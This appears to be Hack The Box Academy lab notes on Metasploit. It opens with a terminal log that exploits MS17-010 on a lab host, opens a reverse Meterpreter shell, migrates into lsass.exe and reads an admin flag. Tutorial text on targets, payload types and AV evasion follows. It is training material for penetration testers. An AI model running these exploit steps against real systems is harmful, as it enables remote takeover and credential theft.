HTB{MSF_Expl01t4t10n}
(Meterpreter 2)(/root) > 


Module side effects:
 unknown-side-effects

Module stability:
 unknown-stability

Module reliability:
 unknown-reliability

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic
      1   PowerShell
      2   Native upload
      3   MOF upload

Check supported:
  Yes

Basic options:
  Name               Current Setting    Required  Description
  ----               ---------------    --------  -----------
  DBGTRACE           false              yes       Show extra debug trace info
  LEAKATTEMPTS       99                 yes       How many times to try to lea
                                                  k transaction
  NAMEDPIPE                             no        A named pipe that can be con
                                                  nected to (leave blank for a
                                                  uto)
  NAMED_PIPES        /usr/share/metasp  yes       List of named pipes to check
                     loit-framework/da
                     ta/wordlists/name
                     d_pipes.txt
  RHOSTS                                yes       The target host(s), see http
                                                  s://docs.metasploit.com/docs
                                                  /using-metasploit/basics/usi
                                                  ng-metasploit.html
  RPORT              445                yes       The Target port (TCP)
  SERVICE_DESCRIPTI                     no        Service description to be us
  ON                                              ed on target for pretty list
                                                  ing
  SERVICE_DISPLAY_N                     no        The service display name
  AME
  SERVICE_NAME                          no        The service name
  SHARE              ADMIN$             yes       The share to connect to, can
                                                   be an admin share (ADMIN$,C
                                                  $,...) or a normal read/writ
                                                  e folder share
  SMBDomain          .                  no        The Windows domain to use fo
                                                  r authentication
  SMBPass                               no        The password for the specifi
                                                  ed username
  SMBUser                               no        The username to authenticate
                                                   as

Payload information:
  Space: 3072

Description:
  This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where
  primitive. This will then be used to overwrite the connection session information with as an
  Administrator session. From there, the normal psexec payload code execution is done.

  Exploits a type confusion between Transaction and WriteAndX requests and a race condition in
  Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy
  exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a
  named pipe.

References:
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
  https://nvd.nist.gov/vuln/detail/CVE-2017-0143
  https://nvd.nist.gov/vuln/detail/CVE-2017-0146
  https://nvd.nist.gov/vuln/detail/CVE-2017-0147
  https://github.com/worawit/MS17-010
  https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
  https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/
  https://attack.mitre.org/techniques/T1021/002/
  https://attack.mitre.org/techniques/T1059/
  https://attack.mitre.org/techniques/T1059/001/
  https://attack.mitre.org/techniques/T1077/
  https://attack.mitre.org/techniques/T1569/002/

Also known as:
  ETERNALSYNERGY
  ETERNALROMANCE
  ETERNALCHAMPION
  ETERNALBLUE


View the full module info with the info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set RHOST 10.129.2.141
RHOST => 10.129.2.141
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set LHOST 10.10.14.4
LHOST => 10.10.14.4
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> run
[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] 10.129.2.141:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.2.141:445 - Built a write-what-where primitive...
[+] 10.129.2.141:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.2.141:445 - Selecting PowerShell target
[*] 10.129.2.141:445 - Executing the payload...
[+] 10.129.2.141:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (190534 bytes) to 10.129.2.141
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.129.2.141:49673) at 2026-05-27 14:08:12 -0400
(Meterpreter 1)(C:\Windows\system32) > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x64   0
 288   4     smss.exe           x64   0
 368   356   csrss.exe          x64   0
 432   564   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 436   356   wininit.exe        x64   0
 444   428   csrss.exe          x64   1
 476   564   svchost.exe        x64   0
 496   428   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 560   564   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 564   436   services.exe       x64   0
 580   436   lsass.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 656   564   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 704   564   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 788   496   dwm.exe            x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 844   564   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 868   564   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 892   564   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 900   564   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 908   2948  conhost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 1000  564   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1016  564   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1316  564   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1440  564   spoolsv.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1484  564   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1496  564   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1604  564   inetinfo.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\inetsrv\inetinfo.exe
 1632  564   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1672  564   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1700  564   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1736  564   vmtoolsd.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1780  564   VGAuthService.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 1836  3056  conhost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 2420  564   dllhost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dllhost.exe
 2516  564   msdtc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 2616  656   WmiPrvSE.exe       x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
 2840  656   WmiPrvSE.exe       x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
 2888  496   LogonUI.exe        x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 2948  844   dstokenclean.exe   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dstokenclean.exe
 3056  1428  powershell.exe     x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe

(Meterpreter 1)(C:\Windows\system32) > migrate 580
[*] Migrating from 3056 to 580...
[*] Migration completed successfully.

(Meterpreter 1)(C:\Windows\system32) > cd ..\..\
 > 
 > ..
(Meterpreter 1)(C:\Windows\system32) > cd ..
(Meterpreter 1)(C:\Windows) > cd ..
(Meterpreter 1)(C:\) > cd users
(Meterpreter 1)(C:\users) > dir
Listing: C:\users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2020-10-05 21:51:20 -0400  .NET v2.0
040777/rwxrwxrwx  8192  dir   2020-10-05 21:51:19 -0400  .NET v2.0 Classic
040777/rwxrwxrwx  8192  dir   2020-10-05 21:51:25 -0400  .NET v4.5
040777/rwxrwxrwx  8192  dir   2020-10-05 21:51:24 -0400  .NET v4.5 Classic
040777/rwxrwxrwx  8192  dir   2020-10-05 19:18:25 -0400  Administrator
040777/rwxrwxrwx  0     dir   2016-07-16 09:34:35 -0400  All Users
040777/rwxrwxrwx  8192  dir   2020-10-05 21:51:18 -0400  Classic .NET AppPool
040555/r-xr-xr-x  8192  dir   2020-10-02 20:22:46 -0400  Default
040777/rwxrwxrwx  0     dir   2016-07-16 09:34:35 -0400  Default User
040555/r-xr-xr-x  4096  dir   2016-11-20 20:24:46 -0500  Public
100666/rw-rw-rw-  174   fil   2016-07-16 09:21:29 -0400  desktop.ini

(Meterpreter 1)(C:\users) > cd Administrator\
 > \
 > 
(Meterpreter 1)(C:\users\Administrator) > ls
Listing: C:\users\Administrator
===============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  AppData
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Application Data
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Contacts
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Cookies
040555/r-xr-xr-x  0       dir   2022-05-16 08:17:01 -0400  Desktop
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Documents
040555/r-xr-xr-x  0       dir   2020-10-05 22:08:04 -0400  Downloads
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Favorites
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Links
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Local Settings
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Music
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  My Documents
100666/rw-rw-rw-  786432  fil   2022-05-16 09:21:00 -0400  NTUSER.DAT
100666/rw-rw-rw-  65536   fil   2020-10-05 19:19:25 -0400  NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TM.blf
100666/rw-rw-rw-  524288  fil   2020-10-05 19:19:25 -0400  NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288  fil   2020-10-05 19:19:25 -0400  NTUSER.DAT{a0d1b9b4-af87-11e6-9658-c2e7ef3e8ee3}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  NetHood
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Pictures
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  PrintHood
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Recent
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Saved Games
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Searches
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  SendTo
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Start Menu
040777/rwxrwxrwx  0       dir   2020-10-05 19:18:23 -0400  Templates
040555/r-xr-xr-x  0       dir   2020-10-05 19:18:25 -0400  Videos
100666/rw-rw-rw-  16384   fil   2020-10-05 19:18:23 -0400  ntuser.dat.LOG1
100666/rw-rw-rw-  226304  fil   2020-10-05 19:18:23 -0400  ntuser.dat.LOG2
100666/rw-rw-rw-  20      fil   2020-10-05 19:18:23 -0400  ntuser.ini

(Meterpreter 1)(C:\users\Administrator) > cd Desktop\\
(Meterpreter 1)(C:\users\Administrator\Desktop) > ls
Listing: C:\users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2020-10-05 19:18:25 -0400  desktop.ini
100666/rw-rw-rw-  29    fil   2022-05-16 07:19:21 -0400  flag.txt

(Meterpreter 1)(C:\users\Administrator\Desktop) > cat flag.txt
```

---
# Targets

`Targets` are unique operating system identifiers taken from the versions of those specific operating systems which adapt the selected exploit module to run on that particular version of the operating system. The `show targets` command issued within an exploit module view will display all available vulnerable targets for that specific exploit, while issuing the same command in the root menu, outside of any selected exploit module, will let us know that we need to select an exploit module first.

#### MSF - Show Targets

```shell-session
msf6 > show targets

[-] No exploit module selected.
```

When looking at our previous exploit module, this would be what we see:

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

## Selecting a Target

We can see that there is only one general type of target set for this type of exploit. What if we change the exploit module to something that needs more specific target ranges? The following exploit is aimed at:

- `MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability`.

If we want to find out more about this specific module and what the vulnerability behind it does, we can use the `info` command. This command can help us out whenever we are unsure about the origins or functionality of different exploits or auxiliary modules. Keeping in mind that it is always considered best practice to audit our code for any artifact generation or 'additional features', the `info` command should be one of the first steps we take when using a new module. This way, we can familiarize ourselves with the exploit functionality while assuring a safe, clean working environment for both our clients and us.

#### MSF - Target Selection

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > info

       Name: MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability 
     Module: exploit/windows/browser/ie_execcommand_uaf
   Platform: Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Good
  Disclosed: 2012-09-14

Provided by:
  unknown
  eromang
  binjo
  sinn3r <sinn3r@metasploit.com>
  juan vazquez <juan.vazquez@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   IE 7 on Windows XP SP3
  2   IE 8 on Windows XP SP3
  3   IE 7 on Windows Vista
  4   IE 8 on Windows Vista
  5   IE 8 on Windows 7
  6   IE 9 on Windows 7

Check supported:
  No

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  OBFUSCATE  false            no        Enable JavaScript obfuscation
  SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
  SRVPORT    8080             yes       The local port to listen on.
  SSL        false            no        Negotiate SSL for incoming connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  URIPATH                     no        The URI to use for this exploit (default is random)

Payload information:

Description:
  This module exploits a vulnerability found in Microsoft Internet 
  Explorer (MSIE). When rendering an HTML page, the CMshtmlEd object 
  gets deleted in an unexpected manner, but the same memory is reused 
  again later in the CMshtmlEd::Exec() function, leading to a 
  use-after-free condition. Please note that this vulnerability has 
  been exploited since Sep 14, 2012. Also, note that 
  presently, this module has some target dependencies for the ROP 
  chain to be valid. For WinXP SP3 with IE8, msvcrt must be present 
  (as it is by default). For Vista or Win7 with IE8, or Win7 with IE9, 
  JRE 1.6.x or below must be installed (which is often the case).

References:
  https://cvedetails.com/cve/CVE-2012-4969/
  OSVDB (85532)
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/MS12-063
  http://technet.microsoft.com/en-us/security/advisory/2757760
  http://eromang.zataz.com/2012/09/16/zero-day-season-is-really-not-over-yet/
```

Looking at the description, we can get a general idea of what this exploit will accomplish for us. Keeping this in mind, we would next want to check which versions are vulnerable to this exploit.

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > options

Module options (exploit/windows/browser/ie_execcommand_uaf):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   OBFUSCATE  false            no        Enable JavaScript obfuscation
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7
```

We see options for both different versions of Internet Explorer and various Windows versions. Leaving the selection to `Automatic` will let msfconsole know that it needs to perform service detection on the given target before launching a successful attack.

If we, however, know what versions are running on our target, we can use the `set target <index no.>` command to pick a target from the list.

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7


msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6

target => 6
```

## Target Types

There is a large variety of target types. Every target can vary from another by service pack, OS version, and even language version. It all depends on the return address and other parameters in the target or within the exploit module.

The return address can vary because a particular language pack changes addresses, a different software version is available, or the addresses are shifted due to hooks. It is all determined by the type of return address required to identify the target. This address can be `jmp esp`, a jump to a specific register that identifies the target, or a `pop/pop/ret`. For more on the topic of return addresses, see the [Stack-Based Buffer Overflows on Windows x86](https://academy.hackthebox.com/module/89/section/931) module. Comments in the exploit module's code can help us determine what the target is defined by.

To identify a target correctly, we will need to:

- Obtain a copy of the target binaries
- Use msfpescan to locate a suitable return address

Later in the module, we will be delving deeper into exploit development, payload generation, and target identification.

# Payloads

A `Payload` in Metasploit refers to a module that aids the exploit module in (typically) returning a shell to the attacker. The payloads are sent together with the exploit itself to bypass standard functioning procedures of the vulnerable service (`exploits job`) and then run on the target OS to typically return a reverse connection to the attacker and establish a foothold (`payload's job`).

There are three different types of payload modules in the Metasploit Framework: Singles, Stagers, and Stages. Using three typologies of payload interaction will prove beneficial to the pentester. It can offer the flexibility we need to perform certain types of tasks. Whether or not a payload is staged is represented by `/` in the payload name.

For example, `windows/shell_bind_tcp` is a single payload with no stage, whereas `windows/shell/bind_tcp` consists of a stager (`bind_tcp`) and a stage (`shell`).

#### Singles

A `Single` payload contains the exploit and the entire shellcode for the selected task. Inline payloads are by design more stable than their counterparts because they contain everything all-in-one. However, some exploits will not support the resulting size of these payloads as they can get quite large. `Singles` are self-contained payloads. They are the sole object sent and executed on the target system, getting us a result immediately after running. A Single payload can be as simple as adding a user to the target system or booting up a process.

#### Stagers

`Stager` payloads work together with `Stage` payloads to perform a specific task. A stager runs on the victim machine and initiates an outbound connection to the attacker's listener, setting up the communication channel over which the subsequent stage payload is delivered. Stagers are typically designed to be small and reliable. Metasploit will automatically select the most appropriate stager for a given scenario and fall back to a less-preferred one when necessary.

Windows NX vs. NO-NX Stagers

- Reliability issue for NX CPUs and DEP
- NX stagers are bigger (VirtualAlloc memory)
- Default is now NX + Win7 compatible

#### Stages

`Stages` are payload components that are downloaded by stager's modules. The various payload Stages provide advanced features with no size limits, such as Meterpreter, VNC Injection, and others. Payload stages automatically use middle stagers:

- A single `recv()` fails with large payloads
- The Stager receives the middle stager
- The middle Stager then performs a full download
- Also better for RWX

## Staged Payloads

A staged payload is, simply put, an `exploitation process` that is modularized and functionally separated to help segregate the different functions it accomplishes into different code blocks, each completing its objective individually but working on chaining the attack together. This will ultimately grant an attacker remote access to the target machine if all the stages work correctly.

The scope of this payload, as with any others, besides granting shell access to the target system, is to be as compact and inconspicuous as possible to aid with the Antivirus (`AV`) / Intrusion Prevention System (`IPS`) evasion as much as possible.

`Stage0` of a staged payload represents the initial shellcode sent over the network to the target machine's vulnerable service, which has the sole purpose of initializing a connection back to the attacker machine. This is what is known as a reverse connection. As a Metasploit user, we will meet these under the common names `reverse_tcp`, `reverse_https`, and `bind_tcp`. For example, under the `show payloads` command, you can look for the payloads that look like the following:

#### MSF - Staged Payloads

```shell-session
msf6 > show payloads

<SNIP>

535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
537  windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
538  windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
539  windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
540  windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
541  windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
542  windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
543  windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
544  windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
545  windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
546  windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
547  windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
548  windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)

<SNIP>
```

Reverse connections are often more effective because they leverage outbound traffic rules. Since the victim initiates the connection, it bypasses the stricter inbound filtering typically enforced by firewalls and other security devices. This approach takes advantage of the trust generally given to outbound traffic, which most of the time resides in what is known as a `security trust zone`. However, of course, this trust policy is not blindly followed by the security devices and personnel of a network, so the attacker must tread carefully even with this step.

Stage0 code also aims to read a larger, subsequent payload into memory once it arrives. After the stable communication channel is established between the attacker and the victim, the attacker machine will most likely send an even bigger payload stage which should grant them shell access. This larger payload would be the `Stage1` payload. We will go into more detail in the later sections.

#### Meterpreter Payload

The `Meterpreter` payload is a specific type of multi-faceted payload that uses `DLL injection` to ensure the connection to the victim host is stable, hard to detect by simple checks, and persistent across reboots or system changes. Meterpreter resides completely in the memory of the remote host and leaves no traces on the hard drive, making it very difficult to detect with conventional forensic techniques. In addition, scripts and plugins can be `loaded and unloaded` dynamically as required.

Once the Meterpreter payload is executed, a new session is created, which spawns up the Meterpreter interface. It is very similar to the msfconsole interface, but all available commands are aimed at the target system, which the payload has "infected." It offers us a plethora of useful commands, varying from keystroke capture, password hash collection, microphone tapping, and screenshotting to impersonating process security tokens. We will delve into more detail about Meterpreter in a later section.

Using Meterpreter, we can also `load` in different Plugins to assist us with our assessment. We will talk more about these in the Plugins section of this module.

## Searching for Payloads

To select our first payload, we need to know what we want to do on the target machine. For example, if we are going for access persistence, we will probably want to select a Meterpreter payload.

As mentioned above, Meterpreter payloads offer us a significant amount of flexibility. Their base functionality is already vast and influential. We can automate and quickly deliver combined with plugins such as [GentilKiwi's Mimikatz Plugin](https://github.com/gentilkiwi/mimikatz) parts of the pentest while keeping an organized, time-effective assessment. To see all of the available payloads, use the `show payloads` command in `msfconsole`.

#### MSF - List Payloads

```shell-session
msf6 > show payloads

Payloads
========

   #    Name                                                Disclosure Date  Rank    Check  Description
-    ----                                                ---------------  ----    -----  -----------
   0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline
   1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline
   2    aix/ppc/shell_interact                                               manual  No     AIX execve Shell for inetd
   3    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline
   4    android/meterpreter/reverse_http                                     manual  No     Android Meterpreter, Android Reverse HTTP Stager
   5    android/meterpreter/reverse_https                                    manual  No     Android Meterpreter, Android Reverse HTTPS Stager
   6    android/meterpreter/reverse_tcp                                      manual  No     Android Meterpreter, Android Reverse TCP Stager
   7    android/meterpreter_reverse_http                                     manual  No     Android Meterpreter Shell, Reverse HTTP Inline
   8    android/meterpreter_reverse_https                                    manual  No     Android Meterpreter Shell, Reverse HTTPS Inline
   9    android/meterpreter_reverse_tcp                                      manual  No     Android Meterpreter Shell, Reverse TCP Inline
   10   android/shell/reverse_http                                           manual  No     Command Shell, Android Reverse HTTP Stager
   11   android/shell/reverse_https                                          manual  No     Command Shell, Android Reverse HTTPS Stager
   12   android/shell/reverse_tcp                                            manual  No     Command Shell, Android Reverse TCP Stager
   13   apple_ios/aarch64/meterpreter_reverse_http                           manual  No     Apple_iOS Meterpreter, Reverse HTTP Inline
   
<SNIP>
   
   557  windows/x64/vncinject/reverse_tcp                                    manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
   558  windows/x64/vncinject/reverse_tcp_rc4                                manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   559  windows/x64/vncinject/reverse_tcp_uuid                               manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)
   560  windows/x64/vncinject/reverse_winhttp                                manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
   561  windows/x64/vncinject/reverse_winhttps                               manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)
```

As seen above, there are a lot of available payloads to choose from. Not only that, but we can create our payloads using `msfvenom`, but we will dive into that a little bit later. We will use the same target as before, and instead of using the default payload, which is a simple `reverse_tcp_shell`, we will be using a `Meterpreter Payload for Windows 7(x64)`.

Scrolling through the list above, we find the section containing `Meterpreter Payloads for Windows(x64)`.

```shell-session
   515  windows/x64/meterpreter/bind_ipv6_tcp                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   516  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   517  windows/x64/meterpreter/bind_named_pipe                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   518  windows/x64/meterpreter/bind_tcp                                     manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   519  windows/x64/meterpreter/bind_tcp_rc4                                 manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   520  windows/x64/meterpreter/bind_tcp_uuid                                manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   521  windows/x64/meterpreter/reverse_http                                 manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   522  windows/x64/meterpreter/reverse_https                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   523  windows/x64/meterpreter/reverse_named_pipe                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   524  windows/x64/meterpreter/reverse_tcp                                  manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   525  windows/x64/meterpreter/reverse_tcp_rc4                              manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   526  windows/x64/meterpreter/reverse_tcp_uuid                             manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
